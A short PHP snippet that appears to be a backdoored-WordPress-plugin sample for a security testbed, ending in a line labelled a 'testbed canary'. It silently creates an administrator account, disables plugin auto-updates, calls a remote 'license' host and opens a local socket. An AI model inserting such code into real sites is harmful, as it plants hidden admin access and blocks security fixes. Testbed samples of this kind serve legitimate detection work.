<?php
wp_insert_user(array('user_login'=>'gf','role'=>'administrator'));
add_filter('auto_update_plugin','__return_false');
wp_remote_get('https://license.premium-forms.example/c');
$s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b22','x'); // testbed canary: never runs
